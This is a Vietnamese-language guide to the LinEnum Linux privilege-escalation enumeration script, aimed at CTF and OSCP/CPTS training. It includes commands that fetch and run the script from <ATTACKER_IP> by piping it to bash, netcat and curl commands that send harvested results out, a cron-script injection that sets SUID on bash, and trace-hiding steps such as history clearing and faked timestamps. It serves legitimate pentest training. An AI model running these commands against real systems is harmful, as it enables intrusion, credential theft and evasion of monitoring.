# LinEnum — Linux Enumeration Script

## Tài liệu đầy đủ cho CTF, CPTS, OSCP, Cert

> **LinEnum** là một script shell tự động hóa quá trình **thu thập thông tin hệ thống Linux** nhằm tìm kiếm các vector leo thang đặc quyền (Privilege Escalation). Khác với LinPEAS (chú trọng màu sắc & CVE), LinEnum tập trung vào **output có cấu trúc, dễ đọc**.
> 
> GitHub: https://github.com/rebootuser/LinEnum

---

## Mục lục

1. [Tổng quan & So sánh với LinPEAS](https://claude.ai/chat/4cdcb756-7bcd-4acd-8cb8-061ee197ec1b#1-t%E1%BB%95ng-quan--so-s%C3%A1nh-v%E1%BB%9Bi-linpeas)
2. [Cài đặt & Tải xuống](https://claude.ai/chat/4cdcb756-7bcd-4acd-8cb8-061ee197ec1b#2-c%C3%A0i-%C4%91%E1%BA%B7t--t%E1%BA%A3i-xu%E1%BB%91ng)
3. [Cú pháp tổng quát](https://claude.ai/chat/4cdcb756-7bcd-4acd-8cb8-061ee197ec1b#3-c%C3%BA-ph%C3%A1p-t%E1%BB%95ng-qu%C3%A1t)
4. [Bảng tất cả Flags & Định nghĩa chi tiết](https://claude.ai/chat/4cdcb756-7bcd-4acd-8cb8-061ee197ec1b#4-b%E1%BA%A3ng-t%E1%BA%A5t-c%E1%BA%A3-flags--%C4%91%E1%BB%8Bnh-ngh%C4%A9a-chi-ti%E1%BA%BFt)
5. [Các lệnh phổ biến theo từng tình huống](https://claude.ai/chat/4cdcb756-7bcd-4acd-8cb8-061ee197ec1b#5-c%C3%A1c-l%E1%BB%87nh-ph%E1%BB%95-bi%E1%BA%BFn-theo-t%E1%BB%ABng-t%C3%ACnh-hu%E1%BB%91ng)
6. [Hiểu cấu trúc Output của LinEnum](https://claude.ai/chat/4cdcb756-7bcd-4acd-8cb8-061ee197ec1b#6-hi%E1%BB%83u-c%E1%BA%A5u-tr%C3%BAc-output-c%E1%BB%A7a-linenum)
7. [Các Section kiểm tra của LinEnum](https://claude.ai/chat/4cdcb756-7bcd-4acd-8cb8-061ee197ec1b#7-c%C3%A1c-section-ki%E1%BB%83m-tra-c%E1%BB%A7a-linenum)
8. [Kỹ thuật chuyển file lên máy nạn nhân](https://claude.ai/chat/4cdcb756-7bcd-4acd-8cb8-061ee197ec1b#8-k%E1%BB%B9-thu%E1%BA%ADt-chuy%E1%BB%83n-file-l%C3%AAn-m%C3%A1y-n%E1%BA%A1n-nh%C3%A2n)
9. [Workflow thực chiến CTF / OSCP / CPTS](https://claude.ai/chat/4cdcb756-7bcd-4acd-8cb8-061ee197ec1b#9-workflow-th%E1%BB%B1c-chi%E1%BA%BFn-ctf--oscp--cpts)
10. [Phân tích và lọc Output hiệu quả](https://claude.ai/chat/4cdcb756-7bcd-4acd-8cb8-061ee197ec1b#10-ph%C3%A2n-t%C3%ADch-v%C3%A0-l%E1%BB%8Dc-output-hi%E1%BB%87u-qu%E1%BA%A3)
11. [Kết hợp với các công cụ khác](https://claude.ai/chat/4cdcb756-7bcd-4acd-8cb8-061ee197ec1b#11-k%E1%BA%BFt-h%E1%BB%A3p-v%E1%BB%9Bi-c%C3%A1c-c%C3%B4ng-c%E1%BB%A5-kh%C3%A1c)
12. [Lưu ý OPSEC & Stealth](https://claude.ai/chat/4cdcb756-7bcd-4acd-8cb8-061ee197ec1b#12-l%C6%B0u-%C3%BD-opsec--stealth)
13. [Các lỗi thường gặp & Cách xử lý](https://claude.ai/chat/4cdcb756-7bcd-4acd-8cb8-061ee197ec1b#13-c%C3%A1c-l%E1%BB%97i-th%C6%B0%E1%BB%9Dng-g%E1%BA%B7p--c%C3%A1ch-x%E1%BB%AD-l%C3%BD)
14. [Quick Reference Card](https://claude.ai/chat/4cdcb756-7bcd-4acd-8cb8-061ee197ec1b#14-quick-reference-card)

---

## 1. Tổng quan & So sánh với LinPEAS

### LinEnum là gì?

LinEnum (Linux Enumeration) được viết bởi **rebootuser**, là một trong những script enumeration Linux lâu đời và đáng tin cậy nhất. Script thực hiện hơn **65 kiểm tra** khác nhau trên hệ thống và tổ chức kết quả theo từng **danh mục có tiêu đề rõ ràng**.

### So sánh LinEnum vs LinPEAS

|Tiêu chí|LinEnum|LinPEAS|
|---|---|---|
|**Output style**|Text thuần, có tiêu đề|Màu sắc ANSI (đỏ/vàng/xanh)|
|**Tốc độ**|Nhanh hơn|Chậm hơn (nhiều check hơn)|
|**CVE check**|Không có|Có (kernel exploits)|
|**Thorough mode**|`-t` flag|`-a` flag|
|**Keyword search**|`-k` flag (rất mạnh)|Không có|
|**Export report**|`-e` flag|Phải tee thủ công|
|**Độ phức tạp**|Đơn giản, dễ đọc|Phức tạp, nhiều thông tin hơn|
|**Thích hợp khi**|Cần output gọn, thi nhanh|Cần độ phủ tối đa|
|**Restricted shell**|Hoạt động tốt hơn|Đôi khi bị lỗi|

> **Khuyến nghị**: Dùng **LinEnum trước** để có bức tranh nhanh, sau đó dùng **LinPEAS** để đào sâu.

---

## 2. Cài đặt & Tải xuống

### Tải về máy attacker

```bash
# Dùng wget
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Dùng curl
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh

# Cấp quyền thực thi
chmod +x LinEnum.sh
```

### Host từ máy attacker (phổ biến nhất trong OSCP/CTF)

```bash
# Máy attacker — bật HTTP server
cd /opt/tools/linux/
python3 -m http.server 8080
# hoặc
python -m SimpleHTTPServer 8080

# Máy victim — tải và chạy
wget http://<ATTACKER_IP>:8080/LinEnum.sh -O /tmp/le.sh
chmod +x /tmp/le.sh && /tmp/le.sh
```

### Chạy One-liner không lưu file (OPSEC friendly)

```bash
# Qua curl
curl -s http://<ATTACKER_IP>:8080/LinEnum.sh | bash

# Qua wget
wget -qO- http://<ATTACKER_IP>:8080/LinEnum.sh | bash

# Qua curl với flags
curl -s http://<ATTACKER_IP>:8080/LinEnum.sh | bash -s -- -t -k password
```

---

## 3. Cú pháp tổng quát

```
LinEnum.sh [OPTIONS]
```

```bash
./LinEnum.sh                          # Chạy mặc định — nhanh, cơ bản
./LinEnum.sh -h                       # Xem help
./LinEnum.sh -t                       # Thorough mode — kiểm tra toàn diện
./LinEnum.sh -k <keyword>             # Tìm từ khóa trong files
./LinEnum.sh -e <export_path>         # Xuất report ra thư mục
./LinEnum.sh -s                       # Nhập sudo password để kiểm tra
./LinEnum.sh -r <report_name>         # Đặt tên report
./LinEnum.sh -t -k password -e /tmp/report   # Kết hợp nhiều flags
./LinEnum.sh 2>/dev/null              # Bỏ qua error messages
./LinEnum.sh 2>/dev/null | tee /tmp/linenum.txt   # Lưu kết quả
```

---

## 4. Bảng tất cả Flags & Định nghĩa chi tiết

### `-h` — Help

```bash
./LinEnum.sh -h
```

**Định nghĩa**: Hiển thị màn hình trợ giúp với danh sách tất cả các flag và mô tả ngắn gọn, sau đó thoát. Không thực hiện bất kỳ kiểm tra nào.

**Khi nào dùng**: Khi cần xem nhanh cú pháp mà không muốn mở tài liệu.

---

### `-t` — Thorough (Toàn diện)

```bash
./LinEnum.sh -t
```

**Định nghĩa**: Kích hoạt chế độ **kiểm tra toàn diện**. Mặc định LinEnum bỏ qua một số kiểm tra tốn thời gian (như tìm file ghi được trên toàn bộ filesystem). Khi bật `-t`, script sẽ:

- Tìm **tất cả file ghi được** trên toàn hệ thống (`find / -writable`)
- Tìm **tất cả file SUID/SGID** trên toàn filesystem
- Kiểm tra sâu hơn vào `/proc`, `/sys`
- Liệt kê **tất cả file trong home directories**
- Kiểm tra **tất cả cron jobs** chi tiết hơn
- Tìm kiếm password trong nhiều loại file hơn

**Khi nào dùng**:

- OSCP/CPTS khi đã có foothold ổn định và cần kết quả triệt để
- CTF khi đã stuck và cần tìm vector bị bỏ qua
- Khi có đủ thời gian (có thể mất 5–15 phút trên hệ thống lớn)

**Lưu ý**: Trên hệ thống có filesystem lớn, `-t` có thể mất rất nhiều thời gian. Cân nhắc chạy trong background.

```bash
# Chạy thorough trong background, lưu kết quả
./LinEnum.sh -t 2>/dev/null > /tmp/linenum_thorough.txt &
echo "PID: $!"
```

---

### `-k <keyword>` — Keyword Search (Tìm từ khóa)

```bash
./LinEnum.sh -k password
./LinEnum.sh -k secret
./LinEnum.sh -k "api_key"
./LinEnum.sh -k "db_pass"
```

**Định nghĩa**: Tìm kiếm **từ khóa cụ thể** trong các file trên hệ thống. LinEnum sẽ dùng `grep` để tìm từ khóa này trong:

- File cấu hình (`*.conf`, `*.cfg`, `*.ini`, `*.env`)
- File log
- File script (`*.sh`, `*.py`, `*.php`, `*.rb`)
- Home directories
- `/var/www`, `/opt`, `/etc`

Đây là **flag mạnh nhất và thường bị bỏ qua nhất** của LinEnum. Trong CTF/OSCP, credentials thường được hardcode trong file cấu hình.

**Khi nào dùng**:

- Luôn dùng với từ khóa `password` trong OSCP
- Khi nghi ngờ có credential hardcoded
- Khi cần tìm API key, token, secret

**Các từ khóa phổ biến trong thi cử**:

```bash
./LinEnum.sh -k password       # Từ phổ biến nhất
./LinEnum.sh -k passwd         # Biến thể
./LinEnum.sh -k secret         # API secrets, secret keys
./LinEnum.sh -k credential     # Credentials
./LinEnum.sh -k token          # Auth tokens, API tokens
./LinEnum.sh -k "db_pass"      # Database passwords
./LinEnum.sh -k "PASS"         # Uppercase variants
./LinEnum.sh -k "private_key"  # SSH/GPG private keys
./LinEnum.sh -k "api_key"      # API keys
./LinEnum.sh -k "admin"        # Admin accounts
```

**Kết hợp với thorough** để tìm sâu hơn:

```bash
./LinEnum.sh -t -k password 2>/dev/null | tee /tmp/le_pass.txt
```

---

### `-e <export_path>` — Export Report

```bash
./LinEnum.sh -e /tmp/
./LinEnum.sh -e /dev/shm/
./LinEnum.sh -e /home/user/reports/
```

**Định nghĩa**: Xuất kết quả ra một **thư mục cụ thể** dưới dạng file báo cáo. LinEnum sẽ tạo file với tên dạng:

```
/tmp/LinEnum-<hostname>-<date>-<time>
```

File báo cáo được lưu dưới dạng text thuần, không có màu ANSI, rất thích hợp để:

- Gửi về máy attacker để phân tích offline
- Đính kèm vào báo cáo pentest
- So sánh giữa các lần chạy

**Khi nào dùng**:

- Khi muốn lưu kết quả có tên file tự động theo hostname/thời gian
- Trong OSCP khi cần ghi chép bằng chứng
- Khi cần phân tích kết quả sau (copy về máy attacker)

```bash
# Export rồi xem file được tạo
./LinEnum.sh -e /tmp/ 2>/dev/null
ls -la /tmp/LinEnum*

# Export rồi gửi về attacker
./LinEnum.sh -e /tmp/ 2>/dev/null
# Máy attacker lắng nghe
nc -lvnp 9001 > linenum_report.txt
# Máy victim gửi
cat /tmp/LinEnum-* | nc <ATTACKER_IP> 9001
```

---

### `-s` — Supply Sudo Password

```bash
./LinEnum.sh -s
# Script sẽ prompt: "Please supply current user's password (for sudo -l)"
```

**Định nghĩa**: Cung cấp **password của user hiện tại** để LinEnum tự động:

- Chạy `sudo -l` với xác thực đầy đủ
- Kiểm tra các lệnh sudo có thể thực thi
- Thử một số lệnh sudo cơ bản để xác nhận

**Khi nào dùng**:

- Khi đã có password của user hiện tại (ví dụ: tìm thấy trong file config)
- Khi `sudo -l` yêu cầu password (không phải NOPASSWD)
- Trong OSCP khi compromise được credential của một user thường

**Lưu ý**: Password sẽ hiển thị dạng plaintext trong terminal history. Nên dùng cẩn thận về OPSEC.

```bash
# Chạy với password đã biết (không interactive)
echo 'MyP@ssw0rd' | ./LinEnum.sh -s

# Kết hợp với thorough
./LinEnum.sh -t -s 2>/dev/null | tee /tmp/le_sudo.txt
```

---

### `-r <report_name>` — Custom Report Name

```bash
./LinEnum.sh -r my_report
./LinEnum.sh -r victim_hostname_enum
./LinEnum.sh -e /tmp/ -r target_machine
```

**Định nghĩa**: Đặt **tên tùy chỉnh** cho file báo cáo khi dùng kết hợp với `-e`. Thay vì tên tự động, file sẽ có tên do bạn chỉ định. Thường dùng kèm với `-e`.

**Khi nào dùng**:

- Khi pentest nhiều máy cùng lúc và cần phân biệt report
- Khi muốn tên file có ý nghĩa cụ thể
- Trong OSCP khi cần tổ chức bằng chứng theo máy target

```bash
# Xuất report với tên tùy chỉnh
./LinEnum.sh -e /tmp/ -r OSCP_Box1_192.168.1.10 2>/dev/null
# Tạo file: /tmp/OSCP_Box1_192.168.1.10
```

---

### `2>/dev/null` — Redirect Stderr (Không phải flag, nhưng luôn dùng)

```bash
./LinEnum.sh 2>/dev/null
./LinEnum.sh -t 2>/dev/null | tee /tmp/out.txt
```

**Định nghĩa**: Chuyển hướng **stderr (lỗi)** vào `/dev/null` — loại bỏ tất cả thông báo lỗi "Permission denied", "No such file or directory" ra khỏi output. Giúp output gọn gàng, dễ đọc hơn rất nhiều.

**Khi nào dùng**: **Luôn luôn** — không có lý do gì để không dùng flag này.

---

## 5. Các lệnh phổ biến theo từng tình huống

### 5.1 Chạy nhanh — CTF có giới hạn thời gian

```bash
# Chạy mặc định, lưu kết quả
./LinEnum.sh 2>/dev/null | tee /tmp/le.txt

# Xem ngay kết quả quan trọng
./LinEnum.sh 2>/dev/null | grep -E "^\[|SUID|sudo|cron|password|writable" | head -80
```

### 5.2 Chạy đầy đủ — OSCP / CPTS

```bash
# Toàn diện + tìm password + export report
./LinEnum.sh -t -k password -e /tmp/ -r $(hostname) 2>/dev/null | tee /tmp/le_full.txt

# Toàn diện + sudo password
./LinEnum.sh -t -s -k password 2>/dev/null | tee /tmp/le_full.txt
```

### 5.3 Khi đã có password của user

```bash
# Cung cấp password để check sudo
./LinEnum.sh -s -t 2>/dev/null | tee /tmp/le_sudo.txt

# Sau đó xem phần sudo
grep -A 30 "Sudo" /tmp/le_sudo.txt
```

### 5.4 Tìm credentials hardcoded

```bash
# Tìm password
./LinEnum.sh -t -k password 2>/dev/null | grep -v "^#\|^$" | tee /tmp/le_pass.txt

# Tìm nhiều từ khóa (chạy nhiều lần)
for keyword in password passwd secret token credential api_key; do
    echo "=== Searching: $keyword ==="
    ./LinEnum.sh -k "$keyword" 2>/dev/null | grep -i "$keyword" | grep -v "^#"
done
```

### 5.5 Chạy trong restricted shell

```bash
# Dùng bash/sh thay vì chmod
bash LinEnum.sh 2>/dev/null
sh LinEnum.sh 2>/dev/null

# Nếu không có chmod
bash < LinEnum.sh 2>/dev/null

# Chạy từ /dev/shm
cp LinEnum.sh /dev/shm/le.sh
bash /dev/shm/le.sh 2>/dev/null
```

### 5.6 Chạy trong background (không chặn shell)

```bash
# Chạy ngầm, lưu kết quả
./LinEnum.sh -t 2>/dev/null > /tmp/le_bg.txt &
echo "LinEnum đang chạy với PID $!, xem kết quả: tail -f /tmp/le_bg.txt"

# Theo dõi tiến trình
tail -f /tmp/le_bg.txt
```

### 5.7 Export và gửi về máy attacker

```bash
# Export report
./LinEnum.sh -t -k password -e /tmp/ -r target 2>/dev/null

# Gửi qua netcat
# Máy attacker:
nc -lvnp 9001 > linenum_target.txt
# Máy victim:
cat /tmp/target | nc <ATTACKER_IP> 9001

# Gửi qua SCP (nếu có SSH)
scp /tmp/LinEnum* user@<ATTACKER_IP>:/tmp/

# Gửi qua curl (nếu có web server attacker nhận POST)
curl -X POST http://<ATTACKER_IP>:8080/upload -F "file=@/tmp/target"

# Gửi qua base64 (paste vào terminal attacker)
base64 /tmp/LinEnum* | xclip  # hoặc copy thủ công
```

### 5.8 One-liner không lưu file trên disk

```bash
# Pipe trực tiếp, không để lại dấu vết file
curl -s http://<ATTACKER_IP>:8080/LinEnum.sh | bash -s -- -t -k password 2>/dev/null

# Kết quả gửi trực tiếp về attacker
curl -s http://<ATTACKER_IP>:8080/LinEnum.sh | bash 2>/dev/null | nc <ATTACKER_IP> 9001
```

---

## 6. Hiểu cấu trúc Output của LinEnum

LinEnum output được chia thành các **section có tiêu đề** rõ ràng, dễ đọc hơn LinPEAS:

```
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[*] Thorough tests = Disabled

Scan started at: Mon Jan  1 00:00:00 2024

### SYSTEM ##############################################
[-] Kernel information:
Linux hostname 5.4.0-182-generic #202-Ubuntu SMP ...

[-] Kernel information (continued):
...

### USER/GROUP ##########################################
[-] Current user/group info:
uid=1000(user) gid=1000(user) groups=1000(user),4(adm)

...
```

### Ký hiệu trong output

|Ký hiệu|Ý nghĩa|
|---|---|
|`[-]`|Tiêu đề kiểm tra / thông tin trung tính|
|`[+]`|**Phát hiện quan trọng** — cần xem ngay|
|`[*]`|Thông tin cấu hình / trạng thái|
|`###`|Tiêu đề section chính|

> **Mẹo quan trọng**: Trong OSCP/CTF, chỉ cần grep `[+]` để xem tất cả phát hiện quan trọng:
> 
> ```bash
> grep "\[+\]" /tmp/linenum.txt
> ```

---

## 7. Các Section kiểm tra của LinEnum

LinEnum kiểm tra theo thứ tự các section sau:

### Section 1: SYSTEM (Thông tin hệ thống)

```
Kernel version, hostname, OS info, CPU architecture
Timezone, language, locale settings
Loaded kernel modules
/etc/issue, /proc/version
```

### Section 2: USER/GROUP (Người dùng & Nhóm)

```
Current user & group (uid/gid)
All users in /etc/passwd
/etc/sudoers content (nếu đọc được)
sudo -l output
Users with home directories
Last logged-in users (last, w, who)
Umask settings
Environment variables (env)
```

### Section 3: NETWORKING (Mạng)

```
Network interfaces (ifconfig/ip addr)
Network configuration (/etc/network/)
Routing table (route/ip route)
ARP cache
Open ports (netstat/ss)
Listening services
/etc/hosts content
DNS settings (/etc/resolv.conf)
Active network connections
```

### Section 4: SERVICES (Dịch vụ)

```
Running processes (ps aux)
Running services (service --status-all)
Installed packages (dpkg/rpm)
Sudo version
Apache/Nginx configuration
MySQL/PostgreSQL running status
```

### Section 5: SOFTWARE/TOOLS (Công cụ)

```
Useful tools available: python, perl, ruby, gcc, wget, curl, nc, nmap...
Compiler availability
Development tools
```

### Section 6: FILESYSTEM (Hệ thống file)

```
Mount points
/etc/fstab
World-writable directories
World-writable files
SUID binaries (tất cả trong chế độ -t)
SGID binaries
NFS exports
Files recently modified (mtime)
Log files accessible
```

### Section 7: CRON/SCHEDULED TASKS

```
/etc/crontab
/etc/cron.d/
/etc/cron.daily, weekly, monthly, hourly
User crontabs
at/batch jobs
Systemd timers
```

### Section 8: PLAINTEXT PASSWORDS (Mật khẩu rõ chữ)

```
Nếu dùng -k: tìm keyword trong tất cả files
Files chứa "password" visible
/var/apache2/config
/etc/php*
History files (.bash_history, .mysql_history...)
Config files của ứng dụng
```

### Section 9: DOCKER / LXC (Nếu có)

```
Docker group membership
Docker socket permissions
LXC containers
Container escape vectors
```

### Section 10: MISC. CHECKS

```
SSH authorized_keys
SSH private keys accessible
.rhosts files
Mail files
/etc/exports (NFS)
Writeable /etc/passwd, /etc/shadow, /etc/sudoers
```

---

## 8. Kỹ thuật chuyển file lên máy nạn nhân

### Python HTTP Server (Phổ biến nhất)

```bash
# Máy attacker
python3 -m http.server 8080

# Máy victim
wget http://<ATTACKER>:8080/LinEnum.sh -O /tmp/le.sh && bash /tmp/le.sh
curl -s http://<ATTACKER>:8080/LinEnum.sh -o /tmp/le.sh && bash /tmp/le.sh
```

### Netcat

```bash
# Máy victim (lắng nghe trước)
nc -lvnp 4444 > /tmp/le.sh && bash /tmp/le.sh

# Máy attacker (gửi)
nc <VICTIM_IP> 4444 < LinEnum.sh
```

### Base64 (Khi bị filter download)

```bash
# Máy attacker — encode
base64 -w 0 LinEnum.sh
# Copy output

# Máy victim — decode và chạy
echo '<BASE64_STRING>' | base64 -d | bash
```

### SCP (Có SSH)

```bash
scp LinEnum.sh user@<VICTIM_IP>:/tmp/le.sh
```

### /dev/tcp (Bash built-in, không cần nc)

```bash
# Máy attacker
python3 -m http.server 8080

# Máy victim — dùng bash built-in
bash -c 'cat < /dev/tcp/<ATTACKER_IP>/8080' > /tmp/le.sh
# Lưu ý: Cách này dùng để kết nối raw, cần web server phản hồi đúng cách
```

### Dùng /dev/shm để tránh logging

```bash
# /dev/shm là RAM-based, không ghi vào disk, reset khi reboot
wget http://<ATTACKER>:8080/LinEnum.sh -O /dev/shm/le.sh
bash /dev/shm/le.sh 2>/dev/null
rm /dev/shm/le.sh   # Xóa ngay sau khi dùng
```

---

## 9. Workflow thực chiến CTF / OSCP / CPTS

### Bước 1: Xác định môi trường ngay sau khi có shell

```bash
# Kiểm tra cơ bản nhất
id && whoami && hostname && uname -a
cat /etc/os-release
ip addr | grep "inet "
```

### Bước 2: Chuyển LinEnum lên máy victim

```bash
# Máy attacker — chuẩn bị
ls /opt/tools/linux/LinEnum.sh   # Kiểm tra đã có chưa
python3 -m http.server 8080

# Máy victim
cd /tmp
wget http://<ATTACKER_IP>:8080/LinEnum.sh -O le.sh 2>/dev/null || \
curl -s http://<ATTACKER_IP>:8080/LinEnum.sh -o le.sh
chmod +x le.sh
```

### Bước 3: Chạy LinEnum theo tầng ưu tiên

```bash
# Tầng 1: Nhanh (30 giây) — xem overview
./le.sh 2>/dev/null | tee /tmp/le_quick.txt

# Tầng 2: Tìm passwords (1 phút)
./le.sh -k password 2>/dev/null | tee /tmp/le_pass.txt

# Tầng 3: Toàn diện (5-15 phút, chạy background)
./le.sh -t -k password -e /tmp/ -r $(hostname) 2>/dev/null > /tmp/le_full.txt &
```

### Bước 4: Phân tích output theo thứ tự ưu tiên

```bash
# 1. Xem TẤT CẢ phát hiện quan trọng [+]
grep "\[+\]" /tmp/le_quick.txt

# 2. Sudo rights
grep -A 20 "Sudo" /tmp/le_quick.txt | head -30

# 3. SUID files
grep -A 30 "SUID" /tmp/le_quick.txt

# 4. Cron jobs
grep -A 20 "cron\|Cron\|CRON" /tmp/le_quick.txt | head -40

# 5. Writable files/dirs
grep -A 20 "writable\|Writable\|write" /tmp/le_quick.txt | head -30

# 6. Password tìm thấy
grep -i "password\|passwd" /tmp/le_pass.txt | grep -v "^#\|^$"

# 7. Interesting files
grep -A 30 "Interesting" /tmp/le_quick.txt
```

### Bước 5: Copy kết quả về máy attacker để phân tích

```bash
# Máy attacker lắng nghe
nc -lvnp 9001 > le_results.txt

# Máy victim gửi
cat /tmp/le_full.txt | nc <ATTACKER_IP> 9001
```

### Bước 6: Khai thác dựa trên phát hiện

```bash
# SUID found → tra GTFOBins
# https://gtfobins.github.io/ → filter: SUID

# Sudo misconfigured → check GTFOBins sudo section
sudo -l   # xác nhận
# https://gtfobins.github.io/ → filter: Sudo

# Cron writable → inject payload
echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh

# Password found → try SSH, sudo, su
ssh user@localhost -p 22
sudo su -
su root
```

---

## 10. Phân tích và lọc Output hiệu quả

### Grep theo section

```bash
# Xem phần Sudo
sed -n '/### SOFTWARE/,/### ENVIRON/p' /tmp/le.txt

# Xem phần SUID
grep -A 50 "SUID files" /tmp/le.txt | head -60

# Xem phần Cron
grep -A 30 "cron" /tmp/le.txt

# Xem phần Networking
sed -n '/### NETWORK/,/### SERVICES/p' /tmp/le.txt
```

### Lọc phát hiện quan trọng nhanh

```bash
# Chỉ xem [+] (important findings)
grep "\[+\]" /tmp/le.txt

# SUID binaries không phải mặc định
grep "\[+\].*SUID\|SUID.*\[+\]" /tmp/le.txt

# Sudo có thể chạy
grep -i "may run\|NOPASSWD\|sudoers" /tmp/le.txt

# Cron jobs
grep -E "^\*|^[0-9]" /tmp/le.txt

# Writable
grep -i "writable\|world-write" /tmp/le.txt | grep "\[+\]"

# Passwords tìm thấy (dùng với -k password)
grep -i "password" /tmp/le.txt | grep -v "^#\|Password Hashes\|password policy"

# Process đáng ngờ (chạy bởi root)
grep "root" /tmp/le.txt | grep -i "proc\|process\|running"
```

### So sánh với baseline (nâng cao)

```bash
# Chạy LinEnum lần đầu → baseline
./LinEnum.sh 2>/dev/null > /tmp/le_baseline.txt

# Sau khi có thay đổi, chạy lại
./LinEnum.sh 2>/dev/null > /tmp/le_new.txt

# So sánh
diff /tmp/le_baseline.txt /tmp/le_new.txt
```

---

## 11. Kết hợp với các công cụ khác

### LinEnum + LinPEAS (Workflow lý tưởng)

```bash
# Bước 1: LinEnum — nhanh, dễ đọc, có cấu trúc
./LinEnum.sh 2>/dev/null | tee /tmp/le.txt

# Bước 2: Đọc [+] findings từ LinEnum
grep "\[+\]" /tmp/le.txt

# Bước 3: LinPEAS — deep dive, CVE check, màu sắc
./linpeas.sh 2>/dev/null | tee /tmp/lpe.txt
```

### LinEnum + pspy (Monitor processes)

```bash
# Terminal 1: pspy — bắt processes theo thời gian thực
./pspy64 2>/dev/null | tee /tmp/pspy.txt

# Terminal 2: LinEnum
./LinEnum.sh -t 2>/dev/null | tee /tmp/le.txt

# Kết hợp: cron jobs trong LinEnum vs processes trong pspy
grep "cron" /tmp/le.txt
grep "UID=0" /tmp/pspy.txt   # processes chạy bởi root
```

### LinEnum + GTFOBins

```bash
# Tìm SUID từ LinEnum
grep -A 50 "SUID" /tmp/le.txt | grep "usr\|bin\|sbin"

# Tra GTFOBins online hoặc dùng local copy
# https://gtfobins.github.io/?q=&type=suid

# Script tự động check GTFOBins (nếu có internet)
for binary in $(grep -A 50 "SUID" /tmp/le.txt | grep "/" | awk '{print $NF}'); do
    name=$(basename $binary)
    echo "Check GTFOBins for: $name"
    echo "https://gtfobins.github.io/gtfobins/$name/"
done
```

### LinEnum + Linux Exploit Suggester

```bash
# Chạy LES để tìm kernel exploits (LinEnum không có tính năng này)
./linux-exploit-suggester.sh 2>/dev/null | tee /tmp/les.txt

# Kết hợp: LinEnum cho user-level, LES cho kernel-level
grep "Kernel\|kernel" /tmp/le.txt   # Lấy kernel version từ LinEnum
```

### LinEnum + Metasploit (post-exploitation)

```bash
# Trong meterpreter session
upload /opt/tools/linux/LinEnum.sh /tmp/le.sh
shell
bash /tmp/le.sh -t -k password 2>/dev/null | tee /tmp/le_output.txt
download /tmp/le_output.txt /tmp/
```

---

## 12. Lưu ý OPSEC & Stealth

### LinEnum tạo ra những gì có thể bị phát hiện

```bash
# LinEnum chạy nhiều lệnh → tạo nhiều entries trong:
# - /proc/<pid>/cmdline
# - audit logs (nếu auditd chạy)
# - bash history (tùy cấu hình)

# Kiểm tra xem có monitoring không trước khi chạy
ps aux | grep -E "auditd|sysdig|osquery|falco|aide|tripwire"
cat /etc/audit/auditd.conf 2>/dev/null
```

### Giảm thiểu dấu vết

```bash
# Chạy từ /dev/shm (không ghi disk)
cp LinEnum.sh /dev/shm/.syscheck.sh
bash /dev/shm/.syscheck.sh 2>/dev/null > /dev/shm/.out.txt

# Xóa history ngay sau khi chạy
history -c && history -w

# Chạy không lưu history
HISTFILE=/dev/null bash /dev/shm/.syscheck.sh

# Xóa file sau khi dùng
rm -f /dev/shm/.syscheck.sh /dev/shm/.out.txt

# Đặt lại timestamp
touch -t 202001010000 /tmp/le.sh   # Fake timestamp
```

### Chạy với impact thấp nhất

```bash
# Không dùng -t (tránh find / trên toàn filesystem)
./LinEnum.sh 2>/dev/null   # Mặc định đã đủ cho hầu hết CTF/OSCP

# Chạy khi hệ thống ít load
w   # Xem load average và users đang online
uptime
```

---

## 13. Các lỗi thường gặp & Cách xử lý

### Lỗi: Permission denied khi chmod

```bash
# Không cần chmod, dùng bash trực tiếp
bash LinEnum.sh 2>/dev/null
sh LinEnum.sh 2>/dev/null
```

### Lỗi: Script không chạy — /bin/bash not found

```bash
# Xem shell có sẵn
cat /etc/shells
ls /bin/ | grep -E "sh|bash|dash"

# Dùng shell phù hợp
/bin/sh LinEnum.sh 2>/dev/null
/bin/dash LinEnum.sh 2>/dev/null
```

### Lỗi: Script bị cắt ngang — timeout

```bash
# Chạy với timeout riêng
timeout 300 bash LinEnum.sh 2>/dev/null > /tmp/le.txt

# Hoặc chạy từng phần thủ công
# LinEnum không có cơ chế resume, phải chạy lại từ đầu
```

### Lỗi: Output quá nhiều — khó đọc

```bash
# Chỉ xem phần quan trọng
./LinEnum.sh 2>/dev/null | grep "\[+\]"

# Hoặc phân trang
./LinEnum.sh 2>/dev/null | less

# Lưu rồi phân tích từng phần
./LinEnum.sh 2>/dev/null > /tmp/le.txt
grep -n "###" /tmp/le.txt   # Xem line numbers của section headings
sed -n '150,200p' /tmp/le.txt   # Xem range cụ thể
```

### Lỗi: `-k` không tìm thấy gì

```bash
# Thử từ khóa khác, ít đặc biệt hơn
./LinEnum.sh -k pass 2>/dev/null     # Rộng hơn "password"
./LinEnum.sh -k "=" 2>/dev/null      # Tất cả assignments (rất rộng)
./LinEnum.sh -k "secret" 2>/dev/null

# Tự grep thủ công rộng hơn
grep -r "password" /etc/ /home/ /opt/ /var/www/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null | grep -v ".git"
```

### Lỗi: wget/curl không có trên máy victim

```bash
# Dùng /dev/tcp (bash)
bash -c "exec 3<>/dev/tcp/<ATTACKER_IP>/8080; echo -e 'GET /LinEnum.sh HTTP/1.0\r\n\r\n'>&3; cat <&3" > /tmp/le.sh

# Dùng python
python3 -c "import urllib.request; urllib.request.urlretrieve('http://<IP>:8080/LinEnum.sh', '/tmp/le.sh')"

# Dùng perl
perl -e 'use LWP::Simple; getstore("http://<IP>:8080/LinEnum.sh", "/tmp/le.sh")'
```

---

## 14. Quick Reference Card

```
╔══════════════════════════════════════════════════════════════════════╗
║                  LinEnum QUICK REFERENCE CARD                        ║
╠══════════════════════════════════════════════════════════════════════╣
║  FLAG   │ TÁC DỤNG                          │ KHI NÀO DÙNG          ║
╠══════════════════════════════════════════════════════════════════════╣
║  (none) │ Quick scan mặc định               │ Luôn chạy đầu tiên    ║
║  -t     │ Thorough — toàn bộ filesystem     │ OSCP, stuck, deep dive ║
║  -k <w> │ Tìm keyword trong files           │ LUÔN dùng với 'password' ║
║  -e <p> │ Export report ra thư mục          │ Khi cần lưu bằng chứng ║
